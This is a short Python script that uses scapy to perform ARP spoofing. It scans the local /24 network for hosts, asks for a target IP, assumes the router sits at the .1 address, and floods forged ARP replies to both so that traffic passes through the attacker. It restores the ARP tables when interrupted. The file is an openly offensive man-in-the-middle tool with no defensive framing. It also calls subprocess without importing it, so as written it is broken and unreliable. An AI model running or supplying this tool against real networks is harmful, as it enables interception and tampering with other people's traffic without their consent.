import socket
import scapy.all as s
import time
def restore(t,r,dt,dr):
    a=s.ARP(op=2,pdst=t,hwdst=dt,psrc=r,hwsrc=dr)
    b=s.ARP(op=2,pdst=r,hwdst=dr,psrc=t,hwsrc=dt)
    s.send(a,verbose=False)
    s.send(b,verbose=False)
    return()
#########################################################
def arp():
    d=scan()
    print("|Ip Address\tMac Address\t|")
    print("_"*45)
    for i,j in d.items():
        print(i,"\t",j)
    t=input("Enter the target IP:- ")
    r=router()
    i=0
    try:
        while(True):
            a=s.ARP(op=2,psrc=r,pdst=t,hwdst=d[t]) #to fool the target
            b=s.ARP(op=2,psrc=t,pdst=r,hwdst=d[r]) #to fool the router
            s.send(a,verbose=False)
            s.send(b,verbose=False)
            i+=2
            print("\r[+] packet sent:- "+str(i),end=" ")

    except KeyboardInterrupt:
        subprocess.run("clear")
        print("restoring....")
        time.sleep(1)
        restore(t,r,d[t],d[r])
        print("Entering Main Menu.........")
        time.sleep(1)
        return()

def scan():
    _=ip().split(".")
    a=""
    for i in range(len(_)-1):
        a+=_[i]
        a+="."
    a+="1/24"
    c=0
    d={}

    arp_request=s.ARP(pdst=a) #to create a request

    arp_broadcast=s.Ether(dst="ff:ff:ff:ff:ff:ff") #to set the returm place
    #dst can be any mac
    arp_complete=arp_broadcast/arp_request #to combine request and broadcast
    answered=s.srp(arp_complete,timeout=3,verbose=False)[0] #to broadcasst or send the packets,answered means ip valid
    #print("***")
    time.sleep(2)
    subprocess.run("clear")
    for i in answered:
        d[i[1].psrc]=i[1].hwsrc
    return(d)

##################################################################################3
def router():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))                         #to get ip
    r=s.getsockname()[0].split(".")
    f=""
    for i in range(len(r)-1):
        f+=r[i]
        f+="."
    f+="1"
    return(f)

def ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    #s.gethostbyname()
    return(str(s.getsockname()[0])) #return ip
#############################################################################
arp()
